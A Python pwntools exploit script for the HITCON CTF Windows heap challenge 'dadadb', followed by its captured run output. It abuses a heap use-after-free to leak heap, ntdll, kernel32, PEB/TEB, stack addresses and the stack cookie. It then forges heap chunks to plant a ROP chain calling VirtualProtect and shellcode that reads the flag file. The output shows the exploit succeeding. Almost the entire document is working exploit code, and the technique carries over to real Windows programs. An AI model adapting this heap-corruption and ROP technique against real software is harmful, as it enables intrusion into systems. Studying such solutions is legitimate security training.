#!/usr/bin/env python
#-*- coding: utf-8 -*-

from pwn import *

context.clear()
context.arch = "amd64"
context.os = "windows"
# context.log_level = "debug"

# p = remote("192.168.199.128", 4869)
p = remote("13.230.51.176", 4869)

def add_(key, sz, s):
    p.recvuntil("@db>> ")
    p.sendline("1")
    p.recvuntil(":")
    p.send(key)
    p.recvuntil(":")
    p.sendline(str(sz))
    p.recvuntil(":")
    p.send(s)

def read_(key):
    p.recvuntil("@db>> ")
    p.sendline("2")
    p.recvuntil(":")
    p.send(key)

def free_(key):
    p.recvuntil("@db>> ")
    p.sendline("3")
    p.recvuntil(":")
    p.send(key)

# login
p.recvuntil(">> ")
p.sendline("1")
p.recvuntil(":")
p.sendline("orange")
p.recvuntil(":")
p.sendline("godlike")

# pause() # attach windbg

# interact
add_("bbb", 0x69, "b"*8)
add_("aaa", 0x300, "a"*0x100)
free_("bbb")
add_("aaa", 0x69, "b"*8)
read_("aaa")
p.recvuntil(":")
p.recv(0x78)

heap_header1 = p.recv(8)[4:7]

heapleak = u64(p.recv(8))
heapbase = heapleak - 0x9c0
log.info("heapbase: %#x", heapbase)

p.recv(0xe8 - 0x88)
header = p.recv(4) + heap_header1 + "\x10"
# log.info("%#x", u64(header))

add_("ccc", 0x10, "a"*8)

z = ""
z += "b"*0x70
z += p64(0)
z += header
z += p64(heapbase) # <-- addr
z += p64(0x300)
add_("aaa", 0x69, z)

read_("ccc")
p.recvuntil(":")
p.recv(0x80)
p.recv(8)
enc_key = u64(p.recv(8))
log.info("encoding: %#x", enc_key)
p.recv(0x2c0 - 0x90)
ntdllleak = u64(p.recv(8))
ntdllbase = ntdllleak - 0x162d10
log.info("ntdll: %#x", ntdllbase)

pebldr = ntdllbase + 0x1643a0
z = ""
z += "b"*0x70
z += p64(0)
z += header
z += p64(pebldr + 0x10) # <-- addr
add_("aaa", 0x69, z)

read_("ccc")
p.recvuntil(":")
leak = u64(p.recv(8))

z = ""
z += "b"*0x70
z += p64(0)
z += header
z += p64(leak + 0x30) # <-- addr
add_("aaa", 0x69, z)

read_("ccc")
p.recvuntil(":")

imagebase = u64(p.recv(8))
log.info("image: %#x", imagebase)

kernel32base = 0x7ff94e011000

z = ""
z += "b"*0x70
z += p64(0)
z += header
z += p64(imagebase + 0x3000) # <-- addr
z += p64(0x250)
add_("aaa", 0x69, z)

read_("ccc")
p.recvuntil(":")

p.recv(0x18)
kernel32leak = u64(p.recv(8))
kernel32base = kernel32leak - 0x1b890
log.info("kernel32: %#x", kernel32base)
p.recv(0x1a8 - 0x20)
fopenaddr = u64(p.recv(8))
p.recv(0x1d0 - 0x1b0)
putsaddr = u64(p.recv(8))
p.recv(0x208 - 0x1d8)
freadaddr = u64(p.recv(8))

log.info("fopen: %#x", fopenaddr)
log.info("puts: %#x", putsaddr)
log.info("fread: %#x", freadaddr)

z = ""
z += "b"*0x70
z += p64(0)
z += header
z += p64(ntdllbase + 0x164308) # <-- addr
z += p64(0x200)
add_("aaa", 0x69, z)

read_("ccc")
p.recvuntil(":")
peb = u64(p.recv(8)) - 0x80
teb = peb + 0x1000
log.info("peb: %#x", peb)
log.info("teb: %#x", teb)

z = ""
z += "b"*0x70
z += p64(0)
z += header
z += p64(teb + 0x10 + 1) # <-- addr
z += p64(0x200)
add_("aaa", 0x69, z)

read_("ccc")
p.recvuntil(":")
stackbase = u64("\x00" + p.recv(7))
log.info("stack base: %#x", stackbase)

for i in range(3):
    z = ""
    z += "b"*0x70
    z += p64(0)
    z += header
    z += p64(stackbase + 0x2000 - (0x1000 * i)) # <-- addr
    z += p64(0x1000)
    add_("aaa", 0x69, z)

    read_("ccc")
    p.recvuntil(":")
    x = p.recv(0x1000)
    if "bbb" in x:
        b = x.find("bbb")
        usefulinfo = stackbase + (0x2000 - (0x1000 * i)) + b
        log.info("useful info: %#x", usefulinfo)
        cookie = u64(x[b+0x200:b+0x200+8]) ^ (usefulinfo - 0x60)
        log.info("cookie: %#x", cookie)
        break

# fix stuff
z = ""
z += "b"*0x70
z += p64(0)
z += header
z += p64(heapbase + 0x9c0) # <-- addr
z += p64(0x10)
add_("aaa", 0x69, z)

z = ""
z += "ccc".ljust(8, '\x00')
z += p64(0)
z += p64(0)
z += p64(0x0000000702000002 ^ enc_key)
z += p64(heapbase + 0x9c0)  # p64(heapbase + 0x8e0)
z += p64(heapbase + 0x8e0)
free_(z)

read_("aaa")
p.recvuntil(":")
p.recv(0x78)
header2 = p.recv(8)
p.recv(0xe8 - 0x80)
header2_aaa = p.recv(8)
p.recv(0x158 - 0xf0)
header2_zzz = p.recv(8)

# log.info("%#x", u64(header2))
# log.info("%#x", u64(header2_aaa))
# log.info("%#x", u64(header2_zzz))

read_(z)

z = ""
z += "d"*0x70
z += p64(0)
z += header2
# z += p64(usefulinfo + 0x100 + 0x10 + 0x10) # fd
# z += p64(usefulinfo + 0x100 + 0x10 + 0x10) # bk
z += p64(usefulinfo - 0x190 + 0x10 + 0x10) # + 0x100 + 0x10 + 0x10)  # fd
z += p64(heapbase + 0x150)                  # bk
z = z.ljust(0xe0, '\x00')
z += p64(0)
z += header2_aaa
z += p64(heapbase + 0x860)
z += p64(0x300)
z += "aaa".ljust(8, '\x00')
z = z.ljust(0x150, '\x00')
z += p64(0)
z += header2_zzz
z += p64(heapbase + 0x150)                 # fd
z += p64(usefulinfo - 0x190 + 0x10 + 0x10) # + 0x100 + 0x10 + 0x10) # bk
add_("aaa", 0x69, z)

# add_("ccc", 0x10, z)

z1 = ""
z1 += "aaa".ljust(8, '\x00')
z1 += p64(0)
z1 += p64(0)
z1 += p64(0x0000000702000002 ^ enc_key)
z1 += p64(heapbase + 0x9c0)  # p64(heapbase + 0x8e0)
z1 += p64(heapbase + 0x8e0)

flag_path = "C:\\dadadb\\flag.txt"
z2 = ""
z2 += "A"*0xe0
z2 += p64(cookie ^ (usefulinfo - 0x1e0))
z2 += "B"*8
z2 += "c"*8
z2 += "d"*8
z2 += "e"*8
# z2 += "ZZZZZZZZ" # start of rop

# 0x0008b450 : pop rdx; pop rcx; pop r8; pop r9; pop r10; pop r11; ret
# 0x8eb30    : <same on remote>

virtualprotect = kernel32base + 0x1a680 # 0x19f90

z2 += flat(
        ntdllbase + 0x8eb30, # fix this
        0x3000,
        stackbase,
        0x40,
        imagebase + 0x5900, 0, 0,
        virtualprotect,
        p64(ntdllbase + 0x8eb30 + 4),
        0, 0, 0,
        usefulinfo
        )

heapcreate = kernel32base + 0x1dc80 # 0x1e790 - 0x1000
processheap = peb + 0x30
buf = usefulinfo + 0xc7 - 3

sc = "\x90"*0x20 +  asm("""
 heapcreate_:
     xor rcx,rcx
     xor rdx,rdx
     xor r8,r8
     xor r9,r9
     xor rdi,rdi
     mov cl,2
     mov rdi,0x%x
     call rdi

     mov rdi,0x%x
     mov qword ptr [rdi],rax

     sub rsp,0x1000
 fopen_flag:
     mov rcx, 0x%x
     mov rdx, 0x%x
     mov r8, 0x%x
     mov rdi, 0x%x
     call rdi
 fread_flag:
     mov rcx, 0x%x
     mov rdx, 0x80
     mov r8, 1
     mov r9, 0x%x
     mov r9, [r9]
     mov rdi, 0x%x
     call rdi
 puts_flag:
     mov rcx, 0x%x
     mov rdi, 0x%x
     call rdi

 sleep:
     jmp sleep
     """ % (heapcreate,processheap,imagebase+0x5900,buf,imagebase+0x3314,fopenaddr,buf,imagebase+0x5900,freadaddr,buf,putsaddr))
z2 += sc
z2 += "C:\\\\dadadb\\\\flag.txt\x00"

add_(z1, 0x10, z2)

p.interactive()

"""
➜  /tmp python x.py
[+] Opening connection to 13.230.51.176 on port 4869: Done
[*] heapbase: 0x261d4850000
[*] encoding: 0xaf8640b34338
[*] ntdll: 0x7ff94e161000
[*] image: 0x7ff7de140000
[*] kernel32: 0x7ff94e011000
[*] fopen: 0x7ff94b2f1770
[*] puts: 0x7ff94b300760
[*] fread: 0x7ff94b2981c0
[*] peb: 0xaf3372d000
[*] teb: 0xaf3372e000
[*] stack base: 0xaf335fd000
[*] useful info: 0xaf335ff910
[*] cookie: 0x90f720f5a869
[!] Could not find system include headers for amd64-windows
[*] Switching to interactive mode
Done!
hitcon{Oh_U_got_the_Exc4libur_in_ddaa-s_HEAP}
Try to learn breath of shadow to kill demon !
[*] Got EOF while reading in interactive
$
[*] Closed connection to 13.230.51.176 port 4869
[*] Got EOF while sending in interactive
➜  /tmp
"""
